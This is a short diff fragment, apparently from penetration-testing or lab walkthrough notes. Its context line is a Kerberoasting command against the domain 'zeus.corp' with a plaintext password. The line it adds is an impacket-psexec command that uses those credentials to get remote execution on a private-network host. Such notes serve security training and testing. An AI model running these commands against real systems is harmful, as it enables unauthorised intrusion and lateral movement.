@@ -9,7 +9,7 @@ impacket-GetUserSPNs 'zeus.corp/Eric.Wallows:EricLikesRunning800' -dc-ip 192.168
 ```
 
 ```
-
+impacket-psexec zeus.corp/'Eric.Wallows':'EricLikesRunning800'@192.168.162.159
 ```
 
 ```
